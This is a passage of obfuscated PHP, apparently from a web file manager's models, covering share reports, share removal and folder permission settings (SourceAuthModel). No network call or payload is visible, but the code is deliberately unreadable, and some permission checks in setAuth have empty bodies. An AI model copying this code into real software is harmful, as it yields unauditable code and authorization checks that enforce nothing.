$b¨ˆ¼‹“‡ß[$d¸­ñ¤ØÜ[28]]; return implode($d¸­ñ¤ØÜ[8], $bèĞ–í¨¬š); goto A¬ÊÑÀ£‚„; c›·‰´ÔÊœ: if (!$a‡ˆ¶Ç”‰¢) { return !1; } $a‡ˆ¶Ç”‰¢ = array_to_keyvalue($a‡ˆ¶Ç”‰¢, $d¸­ñ¤ØÜ[33], $d¸­ñ¤ØÜ[419]); $F›²ô×…ê = $d¸­ñ¤ØÜ[47] . $a¸ŠÎ‰ñöŒ . $d¸­ñ¤ØÜ[47]; goto F¡ˆ‰İğ…Ó; F¡ˆ‰İğ…Ó: $f§™ÒìÒ²× = array($d¸­ñ¤ØÜ[419] => array($d¸­ñ¤ØÜ[7], $a‡ˆ¶Ç”‰¢), $d¸­ñ¤ØÜ[459] => array($d¸­ñ¤ØÜ[751], "\x25{$F›²ô×…ê}\x25"), $d¸­ñ¤ØÜ[397] => 0); $b¨ˆ¼‹“‡ß = Model($d¸­ñ¤ØÜ[752])->where($f§™ÒìÒ²×)->field($d¸­ñ¤ØÜ[2237])->find(); if (!$b¨ˆ¼‹“‡ß) { return !1; } goto DìÄˆÇœì„; C¾‰ğğ—£ç: $d¸­ñ¤ØÜ =& $_SERVER[îÖ]; $f§™ÒìÒ²× = array($d¸­ñ¤ØÜ[419] => array($d¸­ñ¤ØÜ[920], 0), $d¸­ñ¤ØÜ[688] => 3); $a‡ˆ¶Ç”‰¢ = Model($d¸­ñ¤ØÜ[2236])->where($f§™ÒìÒ²×)->field($d¸­ñ¤ØÜ[419])->select(); goto c›·‰´ÔÊœ; A¬ÊÑÀ£‚„: } protected function remove($cğá¥œÌÚ) { goto BÁ´ö¨’‹; F£ÛÛäëä¹: $Fƒ©¥õºÕ± = $this->where($Fƒœ„â´Í˜)->delete(); if ($Fƒ©¥õºÕ±) { Model($fØÌ„Ïİç[537])->where(array($fØÌ„Ïİç[441] => $cğá¥œÌÚ))->delete(); } $E‰ˆ†Ş¬› = is_array($cğá¥œÌÚ) ? $cğá¥œÌÚ[1] : array($cğá¥œÌÚ); goto bœŞ÷ÆìÍ; bœŞ÷ÆìÍ: for ($Aé±İÍ¦© = 0; $Aé±İÍ¦© < count($E‰ˆ†Ş¬›); $Aé±İÍ¦©++) { $f©ÊñÇ¿¾´ = $this->getInfo($E‰ˆ†Ş¬›[$Aé±İÍ¦©]); if ($f©ÊñÇ¿¾´[$fØÌ„Ïİç[448]] == $fØÌ„Ïİç[83]) { Model($fØÌ„Ïİç[505])->eventShare($f©ÊñÇ¿¾´[$fØÌ„Ïİç[369]], $fØÌ„Ïİç[2223]); } if ($f©ÊñÇ¿¾´[$fØÌ„Ïİç[446]] == $fØÌ„Ïİç[83]) { Model($fØÌ„Ïİç[505])->eventShare($f©ÊñÇ¿¾´[$fØÌ„Ïİç[369]], $fØÌ„Ïİç[2222]); } } return $Fƒ©¥õºÕ±; goto b¼Í‡ªŠ’¹; BÁ´ö¨’‹: $fØÌ„Ïİç =& $_SERVER[îÖ]; if (is_array($cğá¥œÌÚ)) { $cğá¥œÌÚ = array($fØÌ„Ïİç[7], $cğá¥œÌÚ); } $Fƒœ„â´Í˜ = array($fØÌ„Ïİç[441] => $cğá¥œÌÚ); goto F£ÛÛäëä¹; b¼Í‡ªŠ’¹: } protected function removeBySource($A ò†Ìí”Ê) { goto B”ãëŞôØŠ; A¯„†‚ÉÕ: $FÛ»Œãèù  = array_to_keyvalue($FÛ»Œãèù , $B®†Ñª´ñ°[33], $B®†Ñª´ñ°[441]); if (!$FÛ»Œãèù ) { return; } $F™„ˆº›ÂŞ = array($B®†Ñª´ñ°[440] => array($B®†Ñª´ñ°[384], $FÛ»Œãèù )); goto b›Ìà´ëœƒ; B”ãëŞôØŠ: $B®†Ñª´ñ° =& $_SERVER[îÖ]; $F™„ˆº›ÂŞ = array($B®†Ñª´ñ°[383] => array($B®†Ñª´ñ°[384], $A ò†Ìí”Ê)); $FÛ»Œãèù  = $this->field($B®†Ñª´ñ°[441])->where($F™„ˆº›ÂŞ)->select(); goto A¯„†‚ÉÕ; b›Ìà´ëœƒ: $this->where($F™„ˆº›ÂŞ)->delete(); Model($B®†Ñª´ñ°[537])->where($F™„ˆº›ÂŞ)->delete(); goto CƒœÙ”êµµ; CƒœÙ”êµµ: } public function listAll($f‚®èºÒé) { goto bÎóš¶£·Õ; fÔØ‚°Èä: return $Aˆ‹Åùİ; goto f¹èêØ¼; bÏ–ÛĞÔç®: $Aˆ‹Åùİ = $this->_makeOrder()->where($a„©‡©’¨©)->selectPage(20); if (empty($Aˆ‹Åùİ[$b®ÖÎ„‰·Õ[354]])) { return array(); } $this->_listDataApply($Aˆ‹Åùİ[$b®ÖÎ„‰·Õ[354]]); goto fÔØ‚°Èä; bÎóš¶£·Õ: $b®ÖÎ„‰·Õ =& $_SERVER[îÖ]; $a„©‡©’¨© = array(); if ($f‚®èºÒé[$b®ÖÎ„‰·Õ[1431]]) { $a„©‡©’¨©[$b®ÖÎ„‰·Õ[1431]] = $f‚®èºÒé[$b®ÖÎ„‰·Õ[1431]]; } goto DÀ¯İœ°çÕ; DÀ¯İœ°çÕ: if ($f‚®èºÒé[$b®ÖÎ„‰·Õ[701]]) { $A¹‹ÏôÇ‘¼ = $f‚®èºÒé[$b®ÖÎ„‰·Õ[702]] ? $f‚®èºÒé[$b®ÖÎ„‰·Õ[702]] : strtotime(date($b®ÖÎ„‰·Õ[2238])); $a„©‡©’¨©[$b®ÖÎ„‰·Õ[187]] = array($b®ÖÎ„‰·Õ[321], array($f‚®èºÒé[$b®ÖÎ„‰·Õ[701]], $A¹‹ÏôÇ‘¼)); } if ($f‚®èºÒé[$b®ÖÎ„‰·Õ[29]]) { $a„©‡©’¨©[$f‚®èºÒé[$b®ÖÎ„‰·Õ[29]]] = 1; } else { $a„©‡©’¨©[] = array($b®ÖÎ„‰·Õ[446] => array($b®ÖÎ„‰·Õ[920], 0), $b®ÖÎ„‰·Õ[448] => array($b®ÖÎ„‰·Õ[920], 0), $b®ÖÎ„‰·Õ[2213] => $b®ÖÎ„‰·Õ[2181]); } if ($f‚®èºÒé[$b®ÖÎ„‰·Õ[2177]]) { $a„©‡©’¨©[] = array($b®ÖÎ„‰·Õ[443] => $f‚®èºÒé[$b®ÖÎ„‰·Õ[2177]], $b®ÖÎ„‰·Õ[1337] => array($b®ÖÎ„‰·Õ[751], "\x25{$f‚®èºÒé[$b®ÖÎ„‰·Õ[2177]]}\x25"), $b®ÖÎ„‰·Õ[2213] => $b®ÖÎ„‰·Õ[2181]); } goto bÏ–ÛĞÔç®; f¹èêØ¼: } public function listDataApply($E×Á¹ª°¯£) { $this->_listDataApply($E×Á¹ª°¯£); return $E×Á¹ª°¯£; } private function _listDataApply(&$Eñ¹…ˆïñÆ) { $eÀğ¨é›˜ =& $_SERVER[îÖ]; $f‰¶êñÃÊ = array_to_keyvalue($Eñ¹…ˆïñÆ, $eÀğ¨é›˜[33], $eÀğ¨é›˜[1431]); $C´èøÁ‡§Ê = Model($eÀğ¨é›˜[477])->userListInfo(array_unique($f‰¶êñÃÊ)); $b¬­·³ºå = array_to_keyvalue($Eñ¹…ˆïñÆ, $eÀğ¨é›˜[33], $eÀğ¨é›˜[369]); $Eï×˜æ‰» = Model($eÀğ¨é›˜[752])->sourceListInfo($b¬­·³ºå, !0); foreach ($Eñ¹…ˆïñÆ as &$BÏ¥Íğ¿‡É) { $bÄø¡öíõ‰ = $BÏ¥Íğ¿‡É[$eÀğ¨é›˜[1431]]; $BÏ¥Íğ¿‡É[$eÀğ¨é›˜[2239]] = $C´èøÁ‡§Ê[$bÄø¡öíõ‰] ? $C´èøÁ‡§Ê[$bÄø¡öíõ‰] : !1; $aê®İ²ªŸæ = $BÏ¥Íğ¿‡É[$eÀğ¨é›˜[369]]; $BÏ¥Íğ¿‡É[$eÀğ¨é›˜[391]] = $Eï×˜æ‰»[$aê®İ²ªŸæ] ? $Eï×˜æ‰»[$aê®İ²ªŸæ] : !1; } } private function _makeOrder($båÇÌ¨ØŠ = '') { goto b½Ş‰Î¬¹™; cìÎ¤îŠ×³: $EÎ…É­õ§  = Input::get($B¼»ÎğâÆë[407], $B¼»ÎğâÆë[7], $B¼»ÎğâÆë[389], $C÷ˆæ‚õß©); $dÆÎ‹©×š‚ = Input::get($B¼»ÎğâÆë[408], $B¼»ÎğâÆë[7], $B¼»ÎğâÆë[2240], array($B¼»ÎğâÆë[2176], $B¼»ÎğâÆë[404])); $dÆÎ‹©×š‚ = $f÷‹…Š¾œÓ[$dÆÎ‹©×š‚]; goto F‡Ø¦Åòê‹; F‡Ø¦Åòê‹: $båÇÌ¨ØŠ = $båÇÌ¨ØŠ . "{$EÎ…É­õ§ }\x20{$dÆÎ‹©×š‚}"; return $this->order($båÇÌ¨ØŠ); goto béùŠ„õ; b½Ş‰Î¬¹™: $B¼»ÎğâÆë =& $_SERVER[îÖ]; $C÷ˆæ‚õß© = array($B¼»ÎğâÆë[187], $B¼»ÎğâÆë[702], $B¼»ÎğâÆë[2225], $B¼»ÎğâÆë[2226]); $f÷‹…Š¾œÓ = array($B¼»ÎğâÆë[402] => $B¼»ÎğâÆë[403], $B¼»ÎğâÆë[404] => $B¼»ÎğâÆë[405]); goto cìÎ¤îŠ×³; béùŠ„õ: } public function reportAdd($Cåäøãêñ÷) { $cà©¸—¨Á =& $_SERVER[îÖ]; $Eùó°Ô§Ş = array($cà©¸—¨Á[441] => $Cåäøãêñ÷[$cà©¸—¨Á[441]], $cà©¸—¨Á[1431] => USER_ID); if (Model($cà©¸—¨Á[2236])->where($Eùó°Ô§Ş)->find()) { return !1; } $E—…ÈÈÇƒÎ = array($cà©¸—¨Á[441] => $Cåäøãêñ÷[$cà©¸—¨Á[441]], $cà©¸—¨Á[1337] => $Cåäøãêñ÷[$cà©¸—¨Á[1337]], $cà©¸—¨Á[369] => $Cåäøãêñ÷[$cà©¸—¨Á[369]], $cà©¸—¨Á[419] => $Cåäøãêñ÷[$cà©¸—¨Á[419]], $cà©¸—¨Á[1431] => USER_ID, $cà©¸—¨Á[29] => $Cåäøãêñ÷[$cà©¸—¨Á[29]], $cà©¸—¨Á[405] => $Cåäøãêñ÷[$cà©¸—¨Á[405]]); return Model($cà©¸—¨Á[2236])->add($E—…ÈÈÇƒÎ); } public function reportList($e‘ù›’ “ø) { goto B¿ö „‚ªÙ; F­ä¾Í¸›Ò: $FÚù±Éè¤ = array($e×ö–³ÒŒ[402] => $e×ö–³ÒŒ[403], $e×ö–³ÒŒ[404] => $e×ö–³ÒŒ[405]); $bù„â…È¹ = $e×ö–³ÒŒ[2244] . $FÚù±Éè¤[$DÙ±µÎ½‡]; $côÜ©‚ µ‘ = Model($e×ö–³ÒŒ[2236])->where($E‚„Åª¼ù¾)->order($bù„â…È¹)->selectPage(20); goto bº˜å¨Ù§; bº˜å¨Ù§: if (empty($côÜ©‚ µ‘[$e×ö–³ÒŒ[354]])) { return array(); } $this->_listDataApply($côÜ©‚ µ‘[$e×ö–³ÒŒ[354]]); return $côÜ©‚ µ‘; goto FÂí¬ŒâĞ÷; bá²Û¸èÎ: if (isset($e‘ù›’ “ø[$e×ö–³ÒŒ[29]]) && in_array($e‘ù›’ “ø[$e×ö–³ÒŒ[29]], array($e×ö–³ÒŒ[83], $e×ö–³ÒŒ[2241], $e×ö–³ÒŒ[2242], $e×ö–³ÒŒ[2243], $e×ö–³ÒŒ[1914]))) { $E‚„Åª¼ù¾[$e×ö–³ÒŒ[29]] = $e‘ù›’ “ø[$e×ö–³ÒŒ[29]]; } if (isset($e‘ù›’ “ø[$e×ö–³ÒŒ[688]]) && in_array($e‘ù›’ “ø[$e×ö–³ÒŒ[688]], array($e×ö–³ÒŒ[468], $e×ö–³ÒŒ[83], $e×ö–³ÒŒ[2241], $e×ö–³ÒŒ[2242]))) { $E‚„Åª¼ù¾[$e×ö–³ÒŒ[688]] = $e‘ù›’ “ø[$e×ö–³ÒŒ[688]]; } $DÙ±µÎ½‡ = Input::get($e×ö–³ÒŒ[408], $e×ö–³ÒŒ[7], $e×ö–³ÒŒ[2240], array($e×ö–³ÒŒ[2176], $e×ö–³ÒŒ[404])); goto F­ä¾Í¸›Ò; B¿ö „‚ªÙ: $e×ö–³ÒŒ =& $_SERVER[îÖ]; $E‚„Åª¼ù¾ = array(); if ($e‘ù›’ “ø[$e×ö–³ÒŒ[701]]) { $aŠÒš„Ì“› = $e‘ù›’ “ø[$e×ö–³ÒŒ[702]] ? $e‘ù›’ “ø[$e×ö–³ÒŒ[702]] : strtotime(date($e×ö–³ÒŒ[2238])); $E‚„Åª¼ù¾[$e×ö–³ÒŒ[187]] = array($e×ö–³ÒŒ[321], array($e‘ù›’ “ø[$e×ö–³ÒŒ[701]], $aŠÒš„Ì“›)); } goto bá²Û¸èÎ; FÂí¬ŒâĞ÷: } public function reportStatus($BãºàéĞæß) { goto AçñÁæÚÛÑ; cÂÖñˆÊÕÃ: if (!$FÀéŒ Áëæ) { return !1; } $C–½¤Ì –± = array($fÏèÚ•Øã[688] => $BãºàéĞæß[$fÏèÚ•Øã[688]]); if ($BãºàéĞæß[$fÏèÚ•Øã[688]] == $fÏèÚ•Øã[2242] && $FÀéŒ Áëæ[$fÏèÚ•Øã[688]] == $fÏèÚ•Øã[2242]) { $C–½¤Ì –±[$fÏèÚ•Øã[688]] = 0; } goto AÄÑÔÉ™²; AçñÁæÚÛÑ: $fÏèÚ•Øã =& $_SERVER[îÖ]; $D¥¿¡ˆò³† = array($fÏèÚ•Øã[367] => $BãºàéĞæß[$fÏèÚ•Øã[367]]); $FÀéŒ Áëæ = Model($fÏèÚ•Øã[2236])->where($D¥¿¡ˆò³†)->field($fÏèÚ•Øã[2245])->find(); goto cÂÖñˆÊÕÃ; AÄÑÔÉ™²: $Eİ†‹¢ğÉÄ = Model($fÏèÚ•Øã[2236])->where($D¥¿¡ˆò³†)->save($C–½¤Ì –±); if ($BãºàéĞæß[$fÏèÚ•Øã[688]] == $fÏèÚ•Øã[2241]) { if ($FÀéŒ Áëæ[$fÏèÚ•Øã[419]] != $fÏèÚ•Øã[468] && $this->shareFileMeta($FÀéŒ Áëæ[$fÏèÚ•Øã[419]])) { $this->shareFileMeta($FÀéŒ Áëæ[$fÏèÚ•Øã[419]], 0); } $this->remove($FÀéŒ Áëæ[$fÏèÚ•Øã[441]]); return !0; } if ($Eİ†‹¢ğÉÄ && $BãºàéĞæß[$fÏèÚ•Øã[688]] == $fÏèÚ•Øã[2242]) { $BÙÅÕÆÑí = $C–½¤Ì –±[$fÏèÚ•Øã[688]] == $fÏèÚ•Øã[2242] ? 1 : 0; $this->shareFileMeta($FÀéŒ Áëæ[$fÏèÚ•Øã[419]], $BÙÅÕÆÑí); $this->removeByFile($FÀéŒ Áëæ[$fÏèÚ•Øã[419]]); } goto Cá’Ÿ“…Ïê; Cá’Ÿ“…Ïê: return $Eİ†‹¢ğÉÄ; goto F­Ş”ÜŞ‰É; F­Ş”ÜŞ‰É: } private function removeByFile($FªÛ†Ä³Ä™) { goto c×Ğ™äñ—Ë; fÄ²«…ñÓŸ: $cï ƒÀ¼Ÿ = array_to_keyvalue($E§¨ Ôê, $b•ªìñ‹¯Ù[33], $b•ªìñ‹¯Ù[441]); $this->remove($cï ƒÀ¼Ÿ); goto bßÀ½éé; c×Ğ™äñ—Ë: $b•ªìñ‹¯Ù =& $_SERVER[îÖ]; $E§¨ Ôê = Model($b•ªìñ‹¯Ù[752])->where(array($b•ªìñ‹¯Ù[419] => $FªÛ†Ä³Ä™))->field($b•ªìñ‹¯Ù[369])->select(); $DÆÔ†ãĞ»® = array_to_keyvalue($E§¨ Ôê, $b•ªìñ‹¯Ù[33], $b•ªìñ‹¯Ù[369]); goto eÀ„‡ÃšÈâ; eÀ„‡ÃšÈâ: $C‚îÁÀÀ· = array($b•ªìñ‹¯Ù[369] => array($b•ªìñ‹¯Ù[7], $DÆÔ†ãĞ»®), $b•ªìñ‹¯Ù[446] => 1); $E§¨ Ôê = Model($b•ªìñ‹¯Ù[2076])->where($C‚îÁÀÀ·)->field($b•ªìñ‹¯Ù[441])->select(); if (empty($E§¨ Ôê)) { return; } goto fÄ²«…ñÓŸ; bßÀ½éé: } private function shareFileMeta($eÛ©«’ƒË, $eŸ¿Ô˜½ÂÆ = null) { $bñ‰·°ïºä =& $_SERVER[îÖ]; $B½ÍÄÏƒ³ = array($bñ‰·°ïºä[419] => $eÛ©«’ƒË, $bñ‰·°ïºä[89] => $bñ‰·°ïºä[2246]); if (is_null($eŸ¿Ô˜½ÂÆ)) { return Model($bñ‰·°ïºä[2247])->where($B½ÍÄÏƒ³)->find(); } $B½ÍÄÏƒ³[$bñ‰·°ïºä[359]] = $eŸ¿Ô˜½ÂÆ; Model($bñ‰·°ïºä[2247])->add($B½ÍÄÏƒ³, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\143\145\137\x61\x75\164\x68"; public function getAuth($BÊ¥õ¾«“Ü) { goto bøÈéŠ™åŠ; bÌâæê…ó¦: return $d»É‰ã„·Û; goto eÙÇËæà£; bøÈéŠ™åŠ: $CÒ¿ô‘¼´› =& $_SERVER[îÖ]; $A¼²šÚ¬ = $CÒ¿ô‘¼´›[2248]; $FƒÎ—¢ß÷ = array($CÒ¿ô‘¼´›[369] => $BÊ¥õ¾«“Ü); goto B§åÏØ–Æƒ; B§åÏØ–Æƒ: $EÒâÃ¢Öñ = $this->field($A¼²šÚ¬)->order($CÒ¿ô‘¼´›[367])->where($FƒÎ—¢ß÷)->select(); $d»É‰ã„·Û = array(); foreach ($EÒâÃ¢Öñ as $dÛç¸‚Ê³) { if (Model($CÒ¿ô‘¼´›[2249])->listData($dÛç¸‚Ê³[$CÒ¿ô‘¼´›[2230]])) { $d»É‰ã„·Û[] = $dÛç¸‚Ê³; } } goto bÌâæê…ó¦; eÙÇËæà£: } public function setAuth($dî¯‰˜¿äè, $d¾Ş¡é‹½—) { goto dâ¶ğÅ˜Ê; dÚ¬ß ‚ø: $B¯öŒÖí† = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $c÷ï¬²ˆÅ = array(); foreach ($d¾Ş¡é‹½— as $D¦¡ï¾Ú) { if (!in_array($D¦¡ï¾Ú[$a‡«§ ë•©[371]], $B¯öŒÖí†)) { show_json(LNG($a‡«§ ë•©[2250]), !1); } if ($E¶ùÁ÷¸‚· != $cğ¿×ò½¥Ô) { if ($D¦¡ï¾Ú[$a‡«§ ë•©[371]] == SourceModel::TYPE_GROUP) { } if ($D¦¡ï¾Ú[$a‡«§ ë•©[456]] != 0 && !in_array($D¦¡ï¾Ú[$a‡«§ ë•©[456]], $BÂöƒòŞ)) { } } if ($D¦¡ï¾Ú[$a‡«§ ë•©[456]] == 0) { $D¦¡ï¾Ú[$a‡«§ ë•©[371]] = SourceModel::TYPE_USER; } $c÷ï¬²ˆÅ[] = array($a‡«§ ë•©[369] => $dî¯‰˜¿äè, $a‡«§ ë•©[371] => intval($D¦¡ï¾Ú[$a‡«§ ë•©[371]]), $a‡«§ ë•©[456] => intval($D¦¡ï¾Ú[$a‡«§ ë•©[456]]), $a‡«§ ë•©[2230] => intval($D¦¡ï¾Ú[$a‡«§ ë•©[2230]]) ? intval($D¦¡ï¾Ú[$a‡«§ ë•©[2230]]) : 0, $a‡«§ ë•©[2231] => intval($D¦¡ï¾Ú[$a‡«§ ë•©[2231]]) ? intval($D¦¡ï¾Ú[$a‡«§ ë•©[2231]]) : -1); } goto A©§²ÚéÂ; A©§²ÚéÂ: $this->where(array($a‡«§ ë•©[383] => $dî¯‰˜¿äè))->delete(); $this->addAll($c÷ï¬²ˆÅ); return !0; goto eÎ—¢±À¾; f«¼«ˆ†ÙŒ: $cğ¿×ò½¥Ô = 1; $E¶ùÁ÷¸‚· = $cİÅİ–­ó[$a‡«§ ë•©[456]]; if ($E¶ùÁ÷¸‚· != $cğ¿×ò½¥Ô) { $AßÕ¸°‡Š = array($a‡«§ ë•©[2099] => $E¶ùÁ÷¸‚·); $BÂöƒòŞ = Model($a‡«§ ë•©[2175])->field($a‡«§ ë•©[1431])->where($AßÕ¸°‡Š)->select(); $BÂöƒòŞ = array_to_keyvalue($BÂöƒòŞ, $a‡«§ ë•©[33], $a‡«§ ë•©[1431]); } goto dÚ¬ß ‚ø; dâ¶ğÅ˜Ê: $a‡«§ ë•© =& $_SERVER[îÖ]; $cİÅİ–­ó = Model($a‡«§ ë•©[1111])->sourceInfo($dî¯‰˜¿äè); if ($cİÅİ–­ó[$a‡«§ ë•©[371]] != SourceModel::TYPE_GROUP) { return !1; } goto f«¼«ˆ†ÙŒ; eÎ—¢±À¾: } public function authClear($CÙ‚¶¤ˆŒÕ) { $E÷“†‘È¦Ş =& $_SERVER[îÖ]; $CÇÉ¤Ö’–§ = Model($E÷“†‘È¦Ş[1111])->sourceInfo($CÙ‚¶¤ˆŒÕ); $aƒ¬½¾”ÒÇ = array($CÙ‚¶¤ˆŒÕ); if ($CÇÉ¤Ö’–§[$E÷“†‘È¦Ş[370]] == $E÷“†‘È¦Ş[83]) { $A–‡¡ˆë² = array($E÷“†‘È¦Ş[525] => array($E÷“†‘È¦Ş[483], $CÇÉ¤Ö’–§[$E÷“†‘È¦Ş[459]] . $CÙ‚¶¤ˆŒÕ . $E÷“†‘È¦Ş[484])); $aƒ¬½¾”ÒÇ = Model($E÷“†‘È¦Ş[1111])->field($E÷“†‘È¦Ş[383])->where($A–‡¡ˆë²)->getField($E÷“†‘È¦Ş[369], !0); $aƒ¬½¾”ÒÇ[] = $CÙ‚¶¤ˆŒÕ; } $this->where(array($E÷“†‘È¦Ş[383] => array($E÷“†‘È¦Ş[384], $aƒ¬½¾”ÒÇ)))->delete(); return !0; } public function get($FøèØï“êÒ) { $e‚à‰— ã = $this->getSourceList(array($FøèØï“êÒ), !0); return $e‚à‰— ã[0]; } public function getSourceList($AÃµ”‹Û¿ë, $E†ŒŠ‘¶å¸ = false) { goto eŠ°Í·¼À; F‰Êç†¤…: $Cø‹Š„Ú = array($Eòé’´êùÓ[383] => array($Eòé’´êùÓ[384], $fÄ“Í›„ŒÁ)); $B‚Ä¯°Ä…µ = $this->field($aœ˜Ìø«Ãƒ)->where($Cø‹Š„Ú)->select(); $B‚Ä¯°Ä…µ = array_to_keyvalue_group($B‚Ä¯°Ä…µ, $Eòé’´êùÓ[369]); goto e×ù÷µÍŠ; eŠ°Í·¼À: $Eòé’´êùÓ =& $_SERVER[îÖ]; if (!$AÃµ”‹Û¿ë) { return array(); } $b¢Ñ–Ö…³ = Model($Eòé’´êùÓ[1111]); goto bÄ—íâ²Ïò; fØÁê’Ê´à: $fÄ“Í›„ŒÁ = array_values(array_unique($fÄ“Í›„ŒÁ)); if (!$fÄ“Í›„ŒÁ) { return array(); } $aœ˜Ìø«Ãƒ = $Eòé’´êùÓ[2252]; goto F‰Êç†¤…; bÄ—íâ²Ïò: if (!$E†ŒŠ‘¶å¸) { $Cø‹Š„Ú = array($Eòé’´êùÓ[383] => array($Eòé’´êùÓ[384], $AÃµ”‹Û¿ë)); $E†ŒŠ‘¶å¸ = $b¢Ñ–Ö…³->field($Eòé’´êùÓ[2251])->where($Cø‹Š„Ú)->select(); $E†ŒŠ‘¶å¸ = array_to_keyvalue($E†ŒŠ‘¶å¸, $Eòé’´êùÓ[369]); } $fÄ“Í›„ŒÁ = $AÃµ”‹Û¿ë; foreach ($E†ŒŠ‘¶å¸ as $dŒ©‚×à· => $cò‹Õ„Ë·Ê) { $BÓŒéœ™„’ = $b¢Ñ–Ö…³->parentLevelArray($cò‹Õ„Ë·Ê[$Eòé’´êùÓ[459]]); $fÄ“Í›„ŒÁ = array_merge($fÄ“Í›„ŒÁ, $BÓŒéœ™„’, array($dŒ©‚×à·)); } goto fØÁê’Ê´à; e×ù÷µÍŠ: $eÄ¾†öÑ§ = array(); foreach ($E†ŒŠ‘¶å¸ as $A·¬Ø„“ => $a¶…íÕÍöº) { $eÄ¾†öÑ§[$A·¬Ø„“] = $this->makeSourceAuth($a¶…íÕÍöº, $B‚Ä¯°Ä…µ); } return $eÄ¾†öÑ§; goto F¥Ÿ‰¾—¼; F¥Ÿ‰¾—¼: } public function authDeepCheck($e¾¿ê„ìÕº) { goto e–íÁõ¼; aŒ¼§å¨–: if (!in_array($e¾¿ê„ìÕº, $fª‹Ñ£õ×„[$eëçÑ·¯Ü°[2253]])) { return !1; } $A¸¹ˆù­„‘ = array(); foreach ($fª‹Ñ£õ×„[$eëçÑ·¯Ü°[2254]] as $fÁÆ¬ñ×Ëß => $cñ¬±…‡£Ù) { if (!in_array($e¾¿ê„ìÕº, $cñ¬±…‡£Ù)) { continue; } $A¸¹ˆù­„‘[] = $fÁÆ¬ñ×Ëß; } goto Eµ—ÎÉ¿²¾; Eµ—ÎÉ¿²¾: $D‰ö‰ŒµÒÄ = $A¸¹ˆù­„‘ ? $A¸¹ˆù­„‘[0] : $e¾¿ê„ìÕº; return array($eëçÑ·¯Ü°[377] => -1, $eëçÑ·¯Ü°[418] => array($eëçÑ·¯Ü°[385] => $eëçÑ·¯Ü°[1025], $eëçÑ·¯Ü°[2105] => $eëçÑ·¯Ü°[468], $eëçÑ·¯Ü°[386] => LNG($eëçÑ·¯Ü°[2255]), $eëçÑ·¯Ü°[2117] => $eëçÑ·¯Ü°[2256]), $eëçÑ·¯Ü°[2257] => array($eëçÑ·¯Ü°[388] => $eëçÑ·¯Ü°[2258], $eëçÑ·¯Ü°[75] => $D‰ö‰ŒµÒÄ)); goto cĞ°ñ„‘»Õ; e–íÁõ¼: $eëçÑ·¯Ü° =& $_SERVER[îÖ]; if (_get($GLOBALS, $eëçÑ·¯Ü°[457])) { return !1; } $fª‹Ñ£õ×„ = $this->makeAuthDeep(); goto aŒ¼§å¨–; cĞ°ñ„‘»Õ: } protected function makeAuthDeep() { goto c¡”…Ñç´ø; BÂ“é¥ ·©: $BÁ¸›î’¢ = array(); $A§´º§”·õ = array(); $Fß—ò›£ğ› = array(); goto fõã Çšææ; BšÔÎ–ÄßÏ: foreach ($fğï…Àå†È as $BÀ®ÍÙç’È => $E‘ÁÛÆïî…) { $EÅŸÚ¥æˆó = $BÁ¸›î’¢[$BÀ®ÍÙç’È]; if (!$EÅŸÚ¥æˆó || !$A§´º§”·õ[$EÅŸÚ¥æˆó]) { continue; } $a¨áÙ×äš© = array(); foreach ($Fß—ò›£ğ›[$EÅŸÚ¥æˆó] as $E¾×ˆ¯Å—í) { $a¨áÙ×äš©[] = $A§´º§”·õ[$E¾×ˆ¯Å—í]; } $fğï…Àå†È[$BÀ®ÍÙç’È] = array_merge($a¨áÙ×äš©, $E‘ÁÛÆïî…); } $A çÑš³‡‰ = array_values(array_unique($A çÑš³‡‰)); $Dƒ·ø æé = array($F ÆËóß”œ[2253] => $A çÑš³‡‰, $F ÆËóß”œ[2254] => $fğï…Àå†È); goto c­ ÂÇŞ½½; D¥ÀË«’´¥: $FÔˆğï·®÷ = Session::get($F ÆËóß”œ[2214]); $FÔˆğï·®÷ = array_to_keyvalue($FÔˆğï·®÷, $F ÆËóß”œ[33], $F ÆËóß”œ[2099]); $A®©ì”èÅ = array($F ÆËóß”œ[371] => SourceModel::TYPE_USER, $F ÆËóß”œ[456] => USER_ID); goto a‘àâãÓÓö; B•ò„Ù©Ôš: $DÄî…¦‘­¸ = Model($F ÆËóß”œ[2259])->listData(); $FäİÊ¨ = array(); foreach ($DÄî…¦‘­¸ as $a¨›óó×‘›) { if ($a¨›óó×‘›[$F ÆËóß”œ[376]] == 0 && $a¨›óó×‘›[$F ÆËóß”œ[2119]] == $F ÆËóß”œ[83]) { $FäİÊ¨[] = $a¨›óó×‘›[$F ÆËóß”œ[367]]; } } goto D¥ÀË«’´¥; c¡”…Ñç´ø: $F ÆËóß”œ =& $_SERVER[îÖ]; static $Dƒ·ø æé = false; if ($Dƒ·ø æé) { return $Dƒ·ø æé; } goto B•ò„Ù©Ôš; fõã Çšææ: if ($A¯Ò‰ÈíÔ¡) { $aî­èùˆ¥ = $D×É«ŠÉ”ß->where(array($F ÆËóß”œ[369] => array($F ÆËóß”œ[384], $A¯Ò‰ÈíÔ¡)))->select(); foreach ($aî­èùˆ¥ as $a¯Ü›×Ù£ø) { $FÜÅŞÍ”§— = $D×É«ŠÉ”ß->parentLevelArray($a¯Ü›×Ù£ø[$F ÆËóß”œ[459]]); $A çÑš³‡‰ = array_merge($A çÑš³‡‰, $FÜÅŞÍ”§—); $F¸Ó¢Ò¾Ö˜[] = $a¯Ü›×Ù£ø[$F ÆËóß”œ[456]]; $fğï…Àå†È[$a¯Ü›×Ù£ø[$F ÆËóß”œ[369]]] = $FÜÅŞÍ”§—; $BÁ¸›î’¢[$a¯Ü›×Ù£ø[$F ÆËóß”œ[369]]] = $a¯Ü›×Ù£ø[$F ÆËóß”œ[456]]; } } $F¸Ó¢Ò¾Ö˜ = array_values(array_unique($F¸Ó¢Ò¾Ö˜)); $aåÙ¦ƒğï„ = $F¸Ó¢Ò¾Ö˜; goto fÎ­…Ù‘¦“; EŞ¤˜†¸ñ: $D×É«ŠÉ”ß = Model($F ÆËóß”œ[1111]); $føî™ßÀ¡™ = Model($F ÆËóß”œ[458]); $fğï…Àå†È = array(); goto BÂ“é¥ ·©; fÎ­…Ù‘¦“: foreach ($aåÙ¦ƒğï„ as $E¾×ˆ¯Å—í) { $bí¿ëÅ¿ìœ = $føî™ßÀ¡™->getInfo($E¾×ˆ¯Å—í); $FÜÅŞÍ”§— = $D×É«ŠÉ”ß->parentLevelArray($bí¿ëÅ¿ìœ[$F ÆËóß”œ[459]]); $F¸Ó¢Ò¾Ö˜ = 